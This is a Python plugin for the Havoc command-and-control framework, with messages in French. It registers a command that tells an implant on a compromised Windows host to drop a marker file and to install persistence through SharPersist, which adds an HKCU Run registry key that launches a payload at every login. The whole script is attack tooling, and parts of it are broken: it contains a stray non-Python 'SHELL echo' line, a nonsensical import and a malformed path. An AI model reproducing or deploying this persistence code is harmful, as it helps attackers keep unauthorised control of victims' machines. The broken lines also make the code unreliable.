from crontab import SHELL
from havoc import Demon, RegisterCommand
import os
import havocui

def create_file_and_persist(demonID, *params):
    demon = Demon(demonID)
    TaskID = None
    
    SHELL echo 'i have been pwn > C:\\Users\\cleme\\AppData\\bahaha.txt' 

    persist_command = r'dotnet inline-execute /home/tbhone/Downloads/SharPersist.exe -t reg -c \"C:\Windows\System32\cmd.exe\" -a \"/c C:Users\cleme\Desktop\ex2.exe\" -k \"hkcurun\" -v \"Test Stuff\" -m add'

    try:
        TaskID = demon.ConsoleWrite(demon.CONSOLE_TASK, "Exécution de la commande de persistance")
        demon.Command(TaskID, persist_command)
        demon.ConsoleWrite(demon.CONSOLE_INFO, "Commande de persistance exécutée avec succès")

        havocui.messagebox("Succès", "Commande de persistance exécutée avec succès.")
    except Exception as e:
        demon.ConsoleWrite(demon.CONSOLE_ERROR, f"Échec de l'exécution de la commande de persistance : {str(e)}")
        return False

    return TaskID

RegisterCommand(create_file_and_persist, "", "create_file_and_persist", "Crée un fichier et configure la persistance avec SharPersist.", 1, "Aucun argument supplémentaire nécessaire", "")